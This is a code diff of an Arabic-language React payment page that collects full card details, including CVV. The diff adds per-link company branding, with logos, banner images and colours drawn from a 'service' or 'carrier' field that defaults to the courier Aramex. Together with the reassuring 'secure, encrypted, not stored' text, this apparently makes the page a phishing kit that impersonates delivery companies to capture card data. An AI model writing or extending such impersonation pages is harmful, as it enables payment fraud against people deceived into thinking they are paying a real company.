@@ -1,25 +1,33 @@
-import { useState } from "react";
+import { useState, useEffect } from "react";
 import { useParams, useNavigate } from "react-router-dom";
 import { Card } from "@/components/ui/card";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
 import { Badge } from "@/components/ui/badge";
-import { usePayment, useUpdatePayment } from "@/hooks/useSupabase";
+import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
+import { usePayment, useUpdatePayment, useLink } from "@/hooks/useSupabase";
 import { Shield, CreditCard, Lock, AlertCircle } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
+import { getServiceBranding } from "@/lib/serviceLogos";
 
 const PaymentCard = () => {
   const { id, paymentId } = useParams();
   const navigate = useNavigate();
   const { toast } = useToast();
   const { data: payment } = usePayment(paymentId);
+  const { data: link } = useLink(payment?.link_id || undefined);
   const updatePayment = useUpdatePayment();
   
   const [cardName, setCardName] = useState("");
   const [cardNumber, setCardNumber] = useState("");
-  const [expiry, setExpiry] = useState("");
+  const [expiryMonth, setExpiryMonth] = useState("");
+  const [expiryYear, setExpiryYear] = useState("");
   const [cvv, setCvv] = useState("");
+  
+  // Get service branding
+  const serviceName = link?.payload?.service || link?.payload?.carrier || 'aramex';
+  const branding = getServiceBranding(serviceName);
   
   const formatCardNumber = (value: string) => {
     const cleaned = value.replace(/\s/g, "");
@@ -27,16 +35,20 @@ const PaymentCard = () => {
     return matches ? matches.join(" ") : cleaned;
   };
   
-  const formatExpiry = (value: string) => {
-    const cleaned = value.replace(/\D/g, "");
-    if (cleaned.length >= 2) {
-      return cleaned.substring(0, 2) + "/" + cleaned.substring(2, 4);
-    }
-    return cleaned;
-  };
+  // Generate month/year options
+  const months = Array.from({ length: 12 }, (_, i) => {
+    const month = (i + 1).toString().padStart(2, '0');
+    return { value: month, label: month };
+  });
+  
+  const currentYear = new Date().getFullYear();
+  const years = Array.from({ length: 15 }, (_, i) => {
+    const year = (currentYear + i).toString().slice(-2);
+    return { value: year, label: `20${year}` };
+  });
   
   const handleSubmit = async () => {
-    if (!cardName || !cardNumber || !expiry || !cvv || !payment) {
+    if (!cardName || !cardNumber || !expiryMonth || !expiryYear || !cvv || !payment) {
       toast({
         title: "خطأ",
         description: "الرجاء ملء جميع الحقول",
@@ -63,32 +75,83 @@ const PaymentCard = () => {
   };
   
   return (
-    <div className="min-h-screen py-4 sm:py-12 bg-gradient-to-b from-background to-secondary/20" dir="rtl">
+    <div 
+      className="min-h-screen py-4 sm:py-12" 
+      dir="rtl"
+      style={{
+        background: `linear-gradient(135deg, ${branding.colors.primary}08, ${branding.colors.secondary}08)`
+      }}
+    >
       <div className="container mx-auto px-3 sm:px-4">
         <div className="max-w-md mx-auto">
+          {/* Company Header Image */}
+          {branding.ogImage && (
+            <div className="mb-4 sm:mb-6 rounded-xl overflow-hidden shadow-lg">
+              <img 
+                src={branding.ogImage} 
+                alt={serviceName}
+                className="w-full h-32 sm:h-48 object-cover"
+                onError={(e) => e.currentTarget.style.display = 'none'}
+              />
+            </div>
+          )}
+          
+          {/* Company Logo */}
+          {branding.logo && (
+            <div className="text-center mb-4 sm:mb-6">
+              <img 
+                src={branding.logo} 
+                alt={serviceName}
+                className="h-10 sm:h-12 mx-auto"
+                onError={(e) => e.currentTarget.style.display = 'none'}
+              />
+            </div>
+          )}
+          
           {/* Security Badge */}
           <div className="text-center mb-3 sm:mb-6">
-            <Badge className="text-xs sm:text-sm px-3 py-1.5 sm:px-4 sm:py-2 bg-gradient-success">
+            <Badge 
+              className="text-xs sm:text-sm px-3 py-1.5 sm:px-4 sm:py-2 text-white"
+              style={{
+                background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
+              }}
+            >
               <Lock className="w-3 h-3 sm:w-4 sm:h-4 ml-1.5 sm:ml-2" />
               <span>معاملة آمنة ومشفّرة</span>
             </Badge>
           </div>
           
-          <Card className="p-4 sm:p-8 shadow-elevated">
+          <Card className="p-4 sm:p-8 shadow-elevated border-2" style={{ borderColor: `${branding.colors.primary}20` }}>
             <div className="flex items-center gap-2 sm:gap-3 mb-4 sm:mb-6">
-              <div className="w-10 h-10 sm:w-12 sm:h-12 bg-gradient-primary rounded-lg sm:rounded-xl flex items-center justify-center">
-                <CreditCard className="w-5 h-5 sm:w-6 sm:h-6 text-primary-foreground" />
+              <div 
+                className="w-10 h-10 sm:w-12 sm:h-12 rounded-lg sm:rounded-xl flex items-center justify-center"
+                style={{
+                  background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
+                }}
+              >
+                <CreditCard className="w-5 h-5 sm:w-6 sm:h-6 text-white" />
               </div>
               <div>
                 <h1 className="text-lg sm:text-2xl font-bold">بيانات البطاقة</h1>
-                <p className="text-xs sm:text-sm text-muted-foreground">الدفع الآمن</p>
+                <p className="text-xs sm:text-sm text-muted-foreground">
+                  {serviceName} - دفع آمن
+                </p>
               </div>
             </div>
             
             {/* Info Alert */}
-            <div className="bg-blue-500/10 border border-blue-500/20 rounded-md sm:rounded-lg p-2 sm:p-3 mb-4 sm:mb-6 flex items-start gap-2">
-              <AlertCircle className="w-4 h-4 sm:w-5 sm:h-5 text-blue-500 mt-0.5 flex-shrink-0" />
-              <p className="text-xs sm:text-sm text-blue-500">
+            <div 
+              className="rounded-md sm:rounded-lg p-2 sm:p-3 mb-4 sm:mb-6 flex items-start gap-2"
+              style={{
+                background: `${branding.colors.primary}10`,
+                border: `1px solid ${branding.colors.primary}30`
+              }}
+            >
+              <AlertCircle 
+                className="w-4 h-4 sm:w-5 sm:h-5 mt-0.5 flex-shrink-0" 
+                style={{ color: branding.colors.primary }}
+              />
+              <p className="text-xs sm:text-sm" style={{ color: branding.colors.primary }}>
                 بياناتك محمية بتقنية التشفير. لا نقوم بحفظ بيانات البطاقة
               </p>
             </div>
@@ -96,46 +159,91 @@ const PaymentCard = () => {
             <div className="space-y-3 sm:space-y-5">
               {/* Cardholder Name */}
               <div>
-                <Label className="mb-1.5 sm:mb-2 text-xs sm:text-sm">اسم حامل البطاقة</Label>
+                <Label className="mb-1.5 sm:mb-2 text-xs sm:text-sm font-semibold">
+                  اسم حامل البطاقة
+                </Label>
                 <Input
                   placeholder="AHMAD ALI"
                   value={cardName}
                   onChange={(e) => setCardName(e.target.value.toUpperCase())}
-                  className="h-10 sm:h-12 text-sm sm:text-lg"
+                  className="h-10 sm:h-12 text-sm sm:text-base border-2 focus:ring-2 transition-all"
+                  style={{
+                    borderColor: `${branding.colors.primary}40`,
+                    '--tw-ring-color': `${branding.colors.primary}50`
+                  } as React.CSSProperties}
                 />
               </div>
               
               {/* Card Number */}
               <div>
-                <Label className="mb-1.5 sm:mb-2 text-xs sm:text-sm">رقم البطاقة</Label>
+                <Label className="mb-1.5 sm:mb-2 text-xs sm:text-sm font-semibold">
+                  رقم البطاقة
+                </Label>
                 <Input
-                  placeholder="4242 4242 4242 4242"
+                  placeholder="0000 0000 0000 0000"
                   value={cardNumber}
                   onChange={(e) =>
                     setCardNumber(formatCardNumber(e.target.value.slice(0, 19)))
                   }
                   inputMode="numeric"
-                  className="h-10 sm:h-12 text-sm sm:text-lg tracking-wider"
+                  className="h-10 sm:h-12 text-sm sm:text-base tracking-wider border-2 focus:ring-2 transition-all font-mono"
+                  style={{
+                    borderColor: `${branding.colors.primary}40`,
+                    '--tw-ring-color': `${branding.colors.primary}50`
+                  } as React.CSSProperties}
                 />
               </div>
               
               {/* Expiry & CVV */}
-              <div className="grid grid-cols-2 gap-3 sm:gap-4">
+              <div className="grid grid-cols-3 gap-2 sm:gap-3">
                 <div>
-                  <Label className="mb-1.5 sm:mb-2 text-xs sm:text-sm">تاريخ الانتهاء</Label>
-                  <Input
-                    placeholder="MM/YY"
-                    value={expiry}
-                    onChange={(e) =>
-                      setExpiry(formatExpiry(e.target.value.slice(0, 4)))
-                    }
-                    inputMode="numeric"
-                    className="h-10 sm:h-12 text-sm sm:text-lg"
-                  />
+                  <Label className="mb-1.5 sm:mb-2 text-xs sm:text-sm font-semibold">
+                    الشهر
+                  </Label>
+                  <Select value={expiryMonth} onValueChange={setExpiryMonth}>
+                    <SelectTrigger 
+                      className="h-10 sm:h-12 text-sm sm:text-base border-2"
+                      style={{
+                        borderColor: `${branding.colors.primary}40`
+                      }}
+                    >
+                      <SelectValue placeholder="MM" />
+                    </SelectTrigger>
+                    <SelectContent className="max-h-[200px]">
+                      {months.map((month) => (
+                        <SelectItem key={month.value} value={month.value}>
+                          {month.label}
+                        </SelectItem>
+                      ))}
+                    </SelectContent>
+                  </Select>
                 </div>
                 
                 <div>
-                  <Label className="mb-1.5 sm:mb-2 text-xs sm:text-sm">CVV</Label>
+                  <Label className="mb-1.5 sm:mb-2 text-xs sm:text-sm font-semibold">
+                    السنة
+                  </Label>
+                  <Select value={expiryYear} onValueChange={setExpiryYear}>
+                    <SelectTrigger 
+                      className="h-10 sm:h-12 text-sm sm:text-base border-2"
+                      style={{
+                        borderColor: `${branding.colors.primary}40`
+                      }}
+                    >
+                      <SelectValue placeholder="YY" />
+                    </SelectTrigger>
+                    <SelectContent className="max-h-[200px]">
+                      {years.map((year) => (
+                        <SelectItem key={year.value} value={year.value}>
+                          {year.label}
+                        </SelectItem>
+                      ))}
+                    </SelectContent>
+                  </Select>
+                </div>
+                
+                <div>
+                  <Label className="mb-1.5 sm:mb-2 text-xs sm:text-sm font-semibold">CVV</Label>
                   <Input
                     placeholder="•••"
                     value={cvv}
@@ -144,7 +252,11 @@ const PaymentCard = () => {
                     }
                     inputMode="numeric"
                     type="password"
-                    className="h-10 sm:h-12 text-sm sm:text-lg"
+                    className="h-10 sm:h-12 text-sm sm:text-base border-2 focus:ring-2 transition-all text-center font-mono"
+                    style={{
+                      borderColor: `${branding.colors.primary}40`,
+                      '--tw-ring-color': `${branding.colors.primary}50`
+                    } as React.CSSProperties}
                     maxLength={3}
                   />
                 </div>
@@ -153,16 +265,19 @@ const PaymentCard = () => {
               {/* Submit Button */}
               <Button
                 size="lg"
-                className="w-full text-sm sm:text-lg py-5 sm:py-7 mt-4 sm:mt-6"
+                className="w-full text-sm sm:text-lg py-5 sm:py-7 mt-4 sm:mt-6 text-white font-bold transition-all hover:shadow-lg"
                 onClick={handleSubmit}
                 disabled={updatePayment.isPending}
+                style={{
+                  background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
+                }}
               >
                 {updatePayment.isPending ? (
                   <span>جاري التفويض...</span>
                 ) : (
                   <>
                     <Shield className="w-4 h-4 sm:w-5 sm:h-5 ml-2" />
-                    <span>تفويض البطاقة</span>
+                    <span>تفويض البطاقة والمتابعة</span>
                   </>
                 )}
               </Button>
